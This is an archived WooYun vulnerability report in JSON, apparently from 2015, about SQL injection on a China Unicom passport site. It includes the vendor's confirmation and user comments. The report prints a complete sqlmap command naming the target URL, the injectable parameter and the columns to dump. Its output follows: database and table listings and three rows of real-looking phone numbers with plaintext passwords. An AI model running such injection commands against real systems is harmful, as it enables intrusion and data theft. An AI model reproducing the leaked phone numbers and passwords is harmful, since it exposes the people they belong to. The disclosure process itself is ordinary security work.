{"id": 6168, "wybug_id": "wooyun-2015-0123114", "wybug_title": "运营商安全之中国联通某重要业务站点SQL注入直取全库(涉及至少200W+用户详细信息含账号明文密码等)", "wybug_corp": "中国联通", "wybug_author": "管管侠", "wybug_date": "2015-06-27 17:51", "wybug_open_date": "2015-08-14 11:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向公众公开  简要描述： 这年头又一个明文存储密码的，也是醉的不省人事了！！7个数据库就读了1个，里面存着200多万的用户详细信息，密码明文，呵呵！！ 详细说明：  http://wo.cn这个业务，通行证子域名，肯定由用户库啊python sqlmap.py -u \"http://passport.wo.cn:30000/favorite-hot-videos/myfavorite.do\" --data \"contentType=3*&pageSize=9&sortid=1000&currpage=1&genre=1&method=getIndexNewAndHotAll\" --dbms=oracle --technique=B --dump -C \"NICKNAME,password,USERPHONE\" -T \"USERREG\" -D \"PERSONAL\"   漏洞证明：  \n\n\n\n\n\n\n\n\n\navailable databases [7]:[*] APPQOSSYS[*] DBSNMP[*] OUTLN[*] PERSONAL[*] SYS[*] SYSTEM[*] TSMSYSDatabase: PERSONAL[92 tables]+----------------------+| ACCESS_SESSION       || ACCESS_TOKEN         || ACCOUNTBIND          || ACCOUNTSLOGIN        || ACTIVITY             || ADMINISTRATIONAREA   || ANNOUNCEMENT         || APP_ACTIVITY         || APP_DOWNURL          || APP_FAVORITE         || APP_SHARE            || APP_SHARE_RECORD     || AUTHCODE             || AUTHORIZE            || AUTH_USERID          || BANNER_POINT_COUNT   || CAKEINFO             || CAKE_BRAND           || CAKE_CITY            || CAKE_DISCUSS         || CAKE_ORDER           || CAKE_PIC             || CAKE_STANDARD        || CENTENTDEPOT         || CENTENTTYPE          || CLIENT_DOWN          || CLIENT_INFO          || CREDITSOPERCOUNT     || CREDITSOPER_DETAIL   || CREDITS_LIMIT        || CRITIQUE             || FAVORITECOUNTREPORT  || FAVORITESPECIAL      || FAVORITE_BOARD       || FILETRANSFER         || FOCUSSPECIAL         || GIFT_EXCHANGE        || GIFT_EXCHANGE_DETAIL || GROWING_BASE         || INFORMATION          || INTERIORMSG          || LIMIT_IP             || MEIPAI               || MEIPAICRITIQUE       || MEIPAILIKE           || MEIPAI_BF            || MESSAGE              || MMS_RECORDS          || MSYS_OPERATELOG      || MYLIKE               || NAVIGATION           || NEWUSERACCOUNT       || PRODUCT              || SENSITIVEWORD        || SENSITIVEWORDGROUP   || SEO_FAVSET           || SEO_INFO             || SHARECOUNTREPORT     || SHORTURL             || SMS_NUM_RECORD       || SMS_RECORDS          || SMS_REPOST           || SNS_BUSINESS         || SORT                 || SPECIAL              || SPECIAL_BOARD        || SSO_COUNT            || SSO_LOGIN_USER       || SUISHOUCATE          || SYS_MARKETING        || SY_ACCOUNT           || SY_MODULE            || SY_ROLE              || SY_ROLE_MODULE       || TAG                  || TEMPLET              || TEMP_VAR             || TWODIM_LOGIN         || UNITEAUTH            || USERBOOKIN           || USERFAVORITE         || USERGROUP            || USERMESLIST          || USERREG              || USERSET              || USERSHARE            || USER_FEEDBACK        || USER_LOGIN_COUNT     || USER_LOGIN_RECORDS   || USER_ONLINE_COUNT    || USER_POSITION        || USER_REG_COUNT       |+----------------------+Database: PERSONALTable: USERREG[28 columns]+--------------+----------+| Column       | Type     |+--------------+----------+| COUNT        | NUMBER   || ACCOUNTSTYPE | NUMBER   || AVATAR       | VARCHAR2 || BACKGROUND   | VARCHAR2 || BAK2         | VARCHAR2 || BAK3         | VARCHAR2 || BLACKLIST    | VARCHAR2 || CREDITSCOUNT | NUMBER   || EMAIL        | VARCHAR2 || EMAILINFO    | NUMBER   || INBLACKLIST  | NUMBER   || LOGINSTATE   | NUMBER   || MMSEXCH      | NUMBER   || NEWINFO      | NUMBER   || NICKNAME     | VARCHAR2 || PASSWORD     | VARCHAR2 || PROPERTY     | VARCHAR2 || REG_SOURCE   | NUMBER   || REGTIME      | VARCHAR2 || SESSIONID    | VARCHAR2 || SMSEXCH      | NUMBER   || SMSINFO      | NUMBER   || SMSMAXACOUNT | NUMBER   || SYSINFO      | NUMBER   || USERCREDITS  | NUMBER   || USERID       | NUMBER   || USERPHONE    | VARCHAR2 || USERSTATE    | NUMBER   |+--------------+----------+\n\n读3条吧Database: PERSONALTable: USERREG[4 entries]+---------------------+-------------+-------------+| NICKNAME            | PASSWORD    | USERPHONE   |+---------------------+-------------+-------------+| <blank>             | 1234        | 18601103866 || <blank>             | 1234        | 18601101602 || <blank>             | 13009860788 | 18601101607 |+---------------------+-------------+-------------+明文存储真真是醉了   修复方案：  其他6个库就没读了   版权声明：转载请注明来源 管管侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-30 11:22 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国联合网络通信集团有限公司通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-27 17:53 |    \t\t高小厨 \t\t\t( 普通白帽子  |\t\t\t        Rank:814 漏洞数:74        | 不会吹牛的小二不是好厨子！)\t\t \n  早就不应该用路人甲身份发了←_←    \n     2015-06-27 17:56 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  — — 。明文？    \n     2015-06-27 17:59 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  MLGB..    \n     2015-06-27 18:35 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  联通真TM不安全，我用着联通卡都怕那一天被人社工了自己还蒙在鼓里，明明是公安才有权利知道的信息，别人也能看。。。无语了    \n     2015-08-14 13:12 |    \t\t无心少年 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 年少心无)\t\t \n  额。。。我用的移动卡    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}